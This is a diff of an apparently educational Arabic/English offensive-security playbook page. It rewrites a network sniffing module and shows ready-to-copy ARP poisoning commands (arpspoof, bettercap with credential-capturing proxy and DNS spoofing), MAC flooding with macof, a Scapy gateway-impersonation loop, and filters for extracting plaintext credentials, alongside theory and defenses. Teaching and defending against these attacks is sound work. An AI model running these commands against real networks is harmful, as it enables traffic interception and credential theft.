@@ -7,8 +7,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@400;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=1784851772?v=4">
-  <link rel="stylesheet" href="css/methodology.css?v=1784851772">
+  <link rel="stylesheet" href="css/style.css?v=1784852602?v=4">
+  <link rel="stylesheet" href="css/methodology.css?v=1784852602">
 
   
 
@@ -569,6 +569,9 @@
           </div>
           <div class="meth-item" id="meth-ef-websocket_sec" onclick="openMethPhase('websocket_sec')" data-search="websocket hacking cswsh xss sqli cross site web socket hijacking">
             <span>├── 🔌</span> <span>WebSocket Hacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'websocket_sec', '🔌 WebSocket Hacking')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-deserialization" onclick="openMethPhase('deserialization')" data-search="insecure deserialization java php python pickle ysoserial phpggc RCE gadget chain">
+            <span>├── ☣️</span> <span>Insecure Deserialization</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'deserialization', '☣️ Insecure Deserialization')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-p15" onclick="openMethPhase('p15')" data-search="cloud security aws s3 bucket iam privilege escalation">
             <span>└── ☁️</span> <span>Cloud Security</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p15', '☁️ Cloud Security')">★</button>
@@ -3540,339 +3543,1543 @@
 
 </div>
 
-      
-<!-- =======================================================
-     CEH MODULE 8: SNIFFING
-     ======================================================= -->
-<div class="meth-content-view" id="meth-content-mod8" style="display:none;" dir="rtl">
-  
+      <div class="meth-content-view" id="meth-content-mod8" style="display: none; --tool-color: #00e5ff;">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
   <div class="cyber-hero">
-    <h2 class="hero-title"><span class="hero-icon">🎧</span> Sniffing</h2>
-    <p class="hero-tagline">اعتراض البيانات، تسميم بروتوكول ARP، وفلاتر Wireshark العميقة.</p>
-    <div class="hero-meta">
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-blue);"></span> Module 08</span>
-      <span class="meta-pill"><span class="pill-dot" style="background:var(--neon-purple);"></span> Deep Dive</span>
+    <h2 class="hero-title"><span class="hero-icon">📡</span> Network Sniffing &amp; Traffic Analysis</h2>
+    <p class="hero-tagline">الاستماع السلبي والنشط لحركة الشبكة — من بروتوكولات TCP/IP إلى اعتراض البيانات الحساسة</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Wireshark · tcpdump · Bettercap · Scapy</span>
+      <span class="badge badge-info">📋 CEH Domain: Sniffing (Weight ~10%)</span>
+      <span style="background: rgba(255,85,85,0.15); color: #ff5555; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High → Critical</span>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">📡</span>
-      <h3>تقنيات هجمات التنصت النشط (Active Sniffing)</h3>
-    </div>
-    
-    <div class="cyber-card" style="--tool-color: #00b4d8;">
-      <div class="card-header"><h4>1. إغراق جدول MAC (MAC Flooding)</h4></div>
-      <p>إغراق الـ Switch بآلاف العناوين المزيفة لملء جدول الـ CAM. هذا يُجبر الـ Switch على العمل كـ Hub، مسبباً بث كل الحزم لجميع المنافذ لالتقاطها.</p>
+  <!-- ═══ SECTION 2: THEORY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — كيف يعمل الـ Sniffing على مستوى البروتوكولات</h3></div>
+
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;" dir="rtl">
+      <div>
+        <h4 style="color: var(--tool-color);">🔌 Passive Sniffing (على شبكات Hub)</h4>
+        <p style="line-height: 1.8; color: var(--text-secondary);">
+          في شبكات الـ Hub القديمة، يتم إرسال كل حزمة (Frame) إلى <strong>جميع الأجهزة المتصلة</strong> في نفس الـ Collision Domain. يستطيع المهاجم فتح بطاقة الشبكة (NIC) في <strong>Promiscuous Mode</strong> لاستقبال وقراءة جميع الحزم — ليس فقط تلك الموجهة إليه.
+        </p>
+        <div style="background: rgba(0,229,255,0.05); border: 1px solid rgba(0,229,255,0.2); border-radius: 6px; padding: 12px; margin-top: 10px;">
+          <strong style="color: var(--tool-color);">Promiscuous Mode:</strong>
+          <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 5px;">وضع خاص في بطاقة الشبكة يجعلها تقبل جميع الحزم التي تمر على الكابل بغض النظر عن عنوان الـ MAC المستهدف. يتم تفعيله تلقائياً بمجرد تشغيل Wireshark أو tcpdump.</p>
+        </div>
+      </div>
+      <div>
+        <h4 style="color: #ff6e27;">⚡ Active Sniffing (على شبكات Switch)</h4>
+        <p style="line-height: 1.8; color: var(--text-secondary);">
+          الـ Switch الحديث يحتفظ بجدول يسمى <strong>CAM Table (Content Addressable Memory)</strong> يربط كل عنوان MAC بالـ Port الذي يتصل به. يرسل الحزمة فقط للـ Port الصحيح — لذا لا يمكن الـ Passive Sniffing هنا. المهاجم يحتاج تقنيات نشطة:
+        </p>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>MAC Flooding</strong> — إغراق الـ CAM Table بعناوين وهمية</li>
+          <li><strong>ARP Spoofing/Poisoning</strong> — التلاعب بجدول ARP</li>
+          <li><strong>DNS Poisoning</strong> — تزوير استجابات DNS</li>
+          <li><strong>DHCP Starvation</strong> — استنزاف عناوين IP الديناميكية</li>
+        </ul>
+      </div>
     </div>
 
-    <div class="cyber-card" style="--tool-color: #ff4757;">
-      <div class="card-header"><h4>2. تسميم ARP (ARP Poisoning / Spoofing)</h4></div>
-      <p>يستغل غياب المصادقة في ARP. المهاجم يُقنع الضحية والـ Gateway بأن جهازه هو الطرف الآخر المستهدف، ليمرر الحركة عبره في هجوم (Man-in-the-Middle).</p>
-    </div>
+    <hr style="border-color: rgba(255,255,255,0.1); margin: 20px 0;">
 
-    <div class="cyber-card" style="--tool-color: #ffa502;">
-      <div class="card-header"><h4>3. تجويع خادم DHCP (DHCP Starvation & Spoofing)</h4></div>
-      <p>استنزاف عناوين הـ IP المتوفرة من خادم الـ DHCP عن طريق إرسال طلبات عناوين وهمية، ليقوم المهاجم لاحقاً بتشغيل Rogue DHCP ويصبح هو الـ Gateway الخاص بالشبكة.</p>
+    <div dir="rtl">
+      <h4 style="color: var(--tool-color);">🔬 بروتوكول ARP — الآلية الجوهرية للـ Active Sniffing</h4>
+      <p style="line-height: 1.8; color: var(--text-secondary);">
+        الـ <strong>ARP (Address Resolution Protocol)</strong> هو بروتوكول L2 يُستخدم لترجمة عناوين IP إلى عناوين MAC على الشبكة المحلية. كل جهاز يحتفظ بـ <strong>ARP Cache</strong> (جدول مؤقت). المشكلة الأساسية:
+      </p>
+      <div style="background: rgba(255,85,85,0.05); border: 1px solid rgba(255,85,85,0.2); border-radius: 6px; padding: 12px; margin: 10px 0;">
+        <strong style="color: #ff5555;">⚠️ ARP is Stateless &amp; Trustless:</strong>
+        <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 5px;">
+          الـ ARP لا يتحقق من صحة الردود. إذا أرسل جهازٌ ما حزمة <code>ARP Reply</code> بدون طلب مسبق (Gratuitous ARP)، سيقوم الجهاز المستقبِل بتحديث جدول الـ ARP Cache فوراً. هذا هو الثغرة الجوهرية التي يستغلها هجوم ARP Poisoning.
+        </p>
+      </div>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
+        <div style="background: rgba(0,0,0,0.3); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 0.85rem;">
+          <div style="color: #94a3b8; margin-bottom: 8px;"># ARP Request (Broadcast)</div>
+          <div style="color: #00ff66;">Who has 192.168.1.1?</div>
+          <div style="color: #94a3b8;">Tell 192.168.1.100</div>
+          <div style="color: #94a3b8; margin-top: 8px;">Dst MAC: FF:FF:FF:FF:FF:FF (Broadcast)</div>
+          <div style="color: #94a3b8;">Src MAC: AA:BB:CC:DD:EE:FF</div>
+        </div>
+        <div style="background: rgba(0,0,0,0.3); border-radius: 8px; padding: 15px; font-family: monospace; font-size: 0.85rem;">
+          <div style="color: #94a3b8; margin-bottom: 8px;"># ARP Reply (Unicast)</div>
+          <div style="color: #00e5ff;">192.168.1.1 is at 00:11:22:33:44:55</div>
+          <div style="color: #94a3b8; margin-top: 8px;">Dst MAC: AA:BB:CC:DD:EE:FF</div>
+          <div style="color: #94a3b8;">Src MAC: 00:11:22:33:44:55</div>
+        </div>
+      </div>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🦈</span>
-      <h3>Wireshark Arsenal (فلاتر وايرشارك المتقدمة)</h3>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — Man-in-the-Middle عبر ARP Poisoning</h3></div>
+    <div dir="rtl">
+      <p style="color: var(--text-secondary); margin-bottom: 20px;">هجوم MITM (Man-in-the-Middle) كلاسيكي على شبكة LAN — مقسّم لمراحل واضحة:</p>
+
+      <div style="display: flex; flex-direction: column; gap: 12px;">
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Network Reconnaissance</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">اكتشاف الشبكة وتحديد الأهداف — عنوان IP الـ Gateway، عناوين الضحايا، خريطة الشبكة المحلية.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Discover active hosts on the network
+sudo nmap -sn 192.168.1.0/24
+
+# Identify the default gateway
+ip route | grep default
+
+# View current ARP cache
+arp -a</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Enable IP Forwarding</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">تفعيل توجيه الحزم (IP Forwarding) حتى تستمر الضحية في الوصول للإنترنت — هذا يجعل الهجوم غير مكتشَف.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Linux: Enable IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+# Or permanently via:
+sudo sysctl -w net.ipv4.ip_forward=1</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">3️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">ARP Poisoning with arpspoof / Bettercap</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">إرسال حزم ARP Reply مزيفة للضحية والـ Gateway لتحويل حركة البيانات عبر جهاز المهاجم.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Using arpspoof (dsniff package):
+# Tell VICTIM that Gateway's MAC is ours
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+# Tell GATEWAY that Victim's MAC is ours (in another terminal)
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# OR using Bettercap (more modern):
+sudo bettercap -iface eth0
+# In bettercap interactive mode:
+net.probe on
+arp.spoof.targets 192.168.1.100
+arp.spoof on</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; align-items: flex-start; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px; text-align: center;">4️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">Traffic Capture &amp; Analysis</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0; font-size: 0.9rem;">بعد نجاح الـ ARP Poisoning، كل حزمة تمر عبر المهاجم — يمكن التقاطها وتحليلها بـ Wireshark أو tcpdump.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Capture all traffic through the attacker:
+sudo tcpdump -i eth0 -w capture.pcap
+
+# Filter for interesting protocols:
+sudo tcpdump -i eth0 port 21 or port 23 or port 80 or port 110
+
+# In Wireshark — display filters:
+# HTTP auth:
+http.authorization
+# FTP credentials:
+ftp.request.command == "PASS"
+# Telnet data:
+telnet</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+      </div>
     </div>
-    <div class="cmd-block">
-      <div class="cmd-header"><span class="cmd-lang">Wireshark Filters</span></div>
-      <pre><code># تصفية حسب عنوان IP معين
-ip.addr == 192.168.1.1
+  </div>
 
-# عرض طلبات ويب من نوع GET أو التي تحتوي على كلمات سر
-http.request.method == "GET"
-http contains "password"
+  <!-- ═══ SECTION 4: WIRESHARK FILTERS ARSENAL ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>⚡ ترسانة Wireshark &amp; tcpdump Filters</h3></div>
+    <div dir="rtl">
+      <p style="color: var(--text-secondary); margin-bottom: 15px;">مرجع شامل لأقوى فلاتر Wireshark وتعبيرات tcpdump لتحليل حركة الشبكة:</p>
 
-# عرض حزم استجابة ARP فقط لاكتشاف تسميم ARP
-arp.opcode == 2
+      <h4 style="color: var(--tool-color); margin-bottom: 10px;">Wireshark Display Filters</h4>
+      <table class="cyber-table" style="width: 100%; margin-bottom: 20px;">
+        <thead>
+          <tr>
+            <th>الغرض</th>
+            <th>Display Filter</th>
+            <th>الشرح</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>HTTP credentials</td><td><code>http.authorization</code></td><td>يعرض طلبات HTTP التي تحمل Authorization header</td></tr>
+          <tr><td>HTTP POST data</td><td><code>http.request.method == "POST"</code></td><td>نماذج تسجيل الدخول وإرسال البيانات</td></tr>
+          <tr><td>FTP passwords</td><td><code>ftp.request.command == "PASS"</code></td><td>كلمات مرور FTP المرسلة بنص واضح</td></tr>
+          <tr><td>DNS queries</td><td><code>dns.qry.name contains "google"</code></td><td>استعلامات DNS المحتوية على كلمة معينة</td></tr>
+          <tr><td>ARP all traffic</td><td><code>arp</code></td><td>جميع حزم ARP — مفيد لاكتشاف ARP Poisoning</td></tr>
+          <tr><td>ARP from specific IP</td><td><code>arp.src.proto_ipv4 == 192.168.1.100</code></td><td>ARP من عنوان IP محدد</td></tr>
+          <tr><td>Suspicious ARP</td><td><code>arp.opcode == 2 &amp;&amp; arp.src.hw_mac != eth.src</code></td><td>كشف ARP Spoofing</td></tr>
+          <tr><td>Large DNS responses</td><td><code>dns &amp;&amp; frame.len > 512</code></td><td>احتمال DNS Amplification</td></tr>
+          <tr><td>SYN packets only</td><td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></td><td>SYN Flood analysis</td></tr>
+          <tr><td>ICMP requests</td><td><code>icmp.type == 8</code></td><td>Echo Request (Ping)</td></tr>
+          <tr><td>Telnet traffic</td><td><code>tcp.port == 23</code></td><td>اتصالات Telnet غير مشفرة</td></tr>
+          <tr><td>SMTP credentials</td><td><code>smtp.req.command == "AUTH"</code></td><td>محاولات تسجيل الدخول عبر البريد الإلكتروني</td></tr>
+          <tr><td>Capture file extract</td><td><code>http &amp;&amp; http.content_type contains "image"</code></td><td>استخراج الصور المرسلة عبر HTTP</td></tr>
+          <tr><td>Detect port scan</td><td><code>tcp.flags == 0x002 &amp;&amp; tcp.window_size == 1024</code></td><td>SYN scan pattern (nmap default)</td></tr>
+        </tbody>
+      </table>
 
-# تصفية حسب عنوان MAC
-eth.addr == 00:11:22:33:44:55</code></pre>
+      <h4 style="color: #ff6e27; margin: 20px 0 10px 0;">tcpdump Capture Filters (BPF Syntax)</h4>
+      <div class="cmd-ui-box">
+# Capture all traffic on interface
+sudo tcpdump -i eth0
+
+# Capture traffic to/from specific host
+sudo tcpdump -i eth0 host 192.168.1.100
+
+# Capture traffic on specific port
+sudo tcpdump -i eth0 port 80
+
+# Capture HTTP POST requests
+sudo tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+
+# Capture FTP, Telnet, HTTP together
+sudo tcpdump -i eth0 'port 21 or port 23 or port 80'
+
+# Write to file and read later in Wireshark
+sudo tcpdump -i eth0 -w /tmp/capture.pcap -G 60 -W 1
+# Read the file
+tcpdump -r /tmp/capture.pcap
+
+# Capture non-encrypted traffic and print ASCII
+sudo tcpdump -i eth0 -A -s 0 'port not 443 and port not 22'
+
+# Show only ARP packets
+sudo tcpdump -i eth0 arp
+
+# Verbose mode with hex dump
+sudo tcpdump -i eth0 -XX -vv</div>
+      <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy All</button>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 5: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مصفوفة الأدوات — مقارنة شاملة</h3></div>
+    <div dir="rtl">
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>المميزات</th>
+            <th>العيوب</th>
+            <th>أوامر أساسية</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Wireshark</strong></td>
+            <td>التحليل التفاعلي البصري للحزم</td>
+            <td>واجهة رسومية، فلاتر قوية، تجميع Sessions</td>
+            <td>لا يحلل حركة Encrypted بدون مفاتيح</td>
+            <td><code>wireshark -i eth0 -k</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">tcpdump</strong></td>
+            <td>Capture سريع من CLI</td>
+            <td>خفيف، يعمل على Servers بدون GUI</td>
+            <td>صعب القراءة المباشرة بدون تحليل</td>
+            <td><code>tcpdump -i eth0 -w out.pcap</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Bettercap</strong></td>
+            <td>MITM كامل بواجهة تفاعلية</td>
+            <td>ARP/DNS/HTTP spoofing في أداة واحدة، API متاح</td>
+            <td>يحتاج صلاحيات Root</td>
+            <td><code>bettercap -iface eth0</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #bd93f9;">Ettercap</strong></td>
+            <td>MITM مع فلتر محتوى</td>
+            <td>Plugin system، filters للتلاعب بالحزم</td>
+            <td>قديم، أقل صيانة</td>
+            <td><code>ettercap -T -q -M arp /GW// /VICTIM//</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #fbbf24;">Scapy</strong></td>
+            <td>بناء وتحليل حزم مخصصة بـ Python</td>
+            <td>مرونة تامة، يدعم جميع البروتوكولات</td>
+            <td>يحتاج برمجة Python</td>
+            <td><code>from scapy.all import *; sniff(iface="eth0")</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff5555;">NetworkMiner</strong></td>
+            <td>استخراج الملفات والبيانات من PCAP</td>
+            <td>يعيد تجميع ملفات من جلسات HTTP/FTP/SMB</td>
+            <td>Windows فقط (GUI)</td>
+            <td>GUI — اسحب ملف PCAP فيه</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 6: COMMANDS PLAYBOOK ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📋 Commands Playbook — أوامر جاهزة بالسيناريو</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;" dir="rtl">
+
+      <details open>
+        <summary style="font-weight: bold; color: var(--tool-color); cursor: pointer; padding: 10px 0;">📡 ARP Poisoning Setup</summary>
+        <div class="cmd-ui-box">
+# Step 1: Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Step 2: ARP Poison victim → tells victim gateway's MAC = ours
+arpspoof -i eth0 -t TARGET_IP GATEWAY_IP
+
+# Step 3: ARP Poison gateway → tells gateway victim's MAC = ours
+arpspoof -i eth0 -t GATEWAY_IP TARGET_IP
+
+# Step 4: Verify ARP table on victim (should show attacker MAC for gateway)
+arp -a | grep GATEWAY_IP</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #ff6e27; cursor: pointer; padding: 10px 0;">🌐 Bettercap Full MITM</summary>
+        <div class="cmd-ui-box">
+# Launch bettercap
+sudo bettercap -iface eth0
+
+# In the interactive console:
+net.probe on          # Discover network hosts
+net.show              # Show discovered hosts
+arp.spoof.targets 192.168.1.100   # Set target
+arp.spoof on          # Start poisoning
+net.sniff on          # Start sniffing
+http.proxy on         # HTTP proxy for credential capture
+dns.spoof on          # DNS spoofing</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #50fa7b; cursor: pointer; padding: 10px 0;">🔍 Network Discovery</summary>
+        <div class="cmd-ui-box">
+# Full subnet scan
+nmap -sn 192.168.1.0/24
+
+# Aggressive discovery with OS detection
+nmap -A -T4 192.168.1.0/24
+
+# Identify services running
+nmap -sV -p 21,22,23,25,80,110,143,443,445 192.168.1.0/24
+
+# MAC address discovery (needs root)
+sudo nmap -sn 192.168.1.0/24 --system-dns</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #bd93f9; cursor: pointer; padding: 10px 0;">🔁 MAC Flooding (CAM Table Overflow)</summary>
+        <div class="cmd-ui-box">
+# Using macof (part of dsniff package):
+# Floods the switch CAM table with random MACs
+# causing it to act like a hub (broadcast mode)
+sudo macof -i eth0
+
+# With target specification:
+sudo macof -i eth0 -n 10000   # send 10000 frames
+
+# Monitor CAM table (on Cisco switch):
+# show mac address-table count
+# show mac address-table dynamic</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(189,147,249,0.15); color: #bd93f9; border: 1px solid #bd93f9; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #fbbf24; cursor: pointer; padding: 10px 0;">🎯 Scapy Custom ARP</summary>
+        <div class="cmd-ui-box">
+# Python/Scapy — craft custom ARP packets
+from scapy.all import *
+
+# Create ARP Reply (Gratuitous ARP)
+packet = ARP(
+    op=2,                    # op=2 is ARP Reply
+    pdst="192.168.1.100",   # Victim IP
+    hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast MAC
+    psrc="192.168.1.1"      # Impersonate gateway
+)
+
+# Send in loop every 2 seconds
+while True:
+    send(packet, verbose=0)
+    time.sleep(2)</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(251,191,36,0.15); color: #fbbf24; border: 1px solid #fbbf24; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; color: #ff5555; cursor: pointer; padding: 10px 0;">📊 PCAP Analysis</summary>
+        <div class="cmd-ui-box">
+# Analyze pcap file with tcpdump
+tcpdump -r capture.pcap -nn -v
+
+# Extract HTTP URLs from pcap
+tcpdump -r capture.pcap -A | grep "GET\|POST\|Host:"
+
+# Extract credentials from pcap (using strings)
+strings capture.pcap | grep -E "user|pass|login|auth"
+
+# Use tshark (Wireshark CLI) for protocol stats
+tshark -r capture.pcap -q -z io,phs
+tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri</div>
+        <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 7: REAL-WORLD CASES ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🏆 دراسات حالة حقيقية</h3></div>
+    <div dir="rtl">
+      <details>
+        <summary style="font-weight: bold; cursor: pointer; font-size: 1.1rem; padding: 10px 0; color: #ff5555;">☕ Case 1: Coffee Shop WiFi Interception — $0 بيانات حساسة</summary>
+        <div style="margin-top: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+          <p style="color: var(--text-secondary); line-height: 1.8;"><strong>السيناريو:</strong> باحث أمني في مقهى عام يستخدم WiFi مفتوح. قام بتشغيل Wireshark على نفس الشبكة واكتشف:</p>
+          <ul style="color: var(--text-secondary); line-height: 2;">
+            <li>حركة HTTP غير مشفرة تحمل credentials لمواقع قديمة</li>
+            <li>جلسات FTP بكلمات مرور واضحة لرفع ملفات المشاريع</li>
+            <li>نماذج تسجيل دخول لمنتديات قديمة بدون HTTPS</li>
+          </ul>
+          <div style="background: rgba(255,85,85,0.1); border: 1px solid rgba(255,85,85,0.3); border-radius: 6px; padding: 12px; margin-top: 10px;">
+            <strong style="color: #ff5555;">الدرس المستفاد:</strong>
+            <p style="color: var(--text-secondary); margin: 5px 0 0 0;">أي بروتوكول غير مشفر (HTTP, FTP, Telnet, SMTP plain) على شبكة مشتركة = خطر فعلي. HTTPS ليس رفاهية بل ضرورة.</p>
+          </div>
+        </div>
+      </details>
+
+      <details>
+        <summary style="font-weight: bold; cursor: pointer; font-size: 1.1rem; padding: 10px 0; color: #fbbf24;">🏭 Case 2: Corporate LAN MITM — اعتراض VoIP Calls</summary>
+        <div style="margin-top: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+          <p style="color: var(--text-secondary); line-height: 1.8;"><strong>السيناريو:</strong> خلال pentest داخلي، نجح الفريق في تنفيذ ARP Poisoning وفصل حركة VoIP (SIP/RTP غير مشفر).</p>
+          <ul style="color: var(--text-secondary); line-height: 2;">
+            <li>استخراج حزم RTP وتحويلها لملف صوتي بـ Wireshark (Telephony → VoIP Calls)</li>
+            <li>سماع محادثات داخلية تحتوي على معلومات حساسة</li>
+            <li>التأثير: معلومات العملاء، صفقات تجارية، قرارات الإدارة</li>
+          </ul>
+          <div style="background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.3); border-radius: 6px; padding: 12px; margin-top: 10px;">
+            <strong style="color: #fbbf24;">في Wireshark:</strong>
+            <code style="display: block; margin-top: 5px; color: var(--text-secondary);">Telephony → VoIP Calls → Select call → Play Streams</code>
+          </div>
+        </div>
+      </details>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 8: DEFENSE ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — Defense in Depth</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;" dir="rtl">
+      <div>
+        <h4 style="color: #50fa7b;">✅ حماية على مستوى الشبكة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Dynamic ARP Inspection (DAI):</strong> يتحقق من صحة حزم ARP مقابل DHCP Snooping table</li>
+          <li><strong>DHCP Snooping:</strong> يمنع DHCP Rogue Servers من الرد على الطلبات</li>
+          <li><strong>Port Security:</strong> تحديد أقصى عدد MAC لكل port على الـ Switch</li>
+          <li><strong>802.1X (Port-based NAC):</strong> مصادقة الأجهزة قبل السماح لها بالشبكة</li>
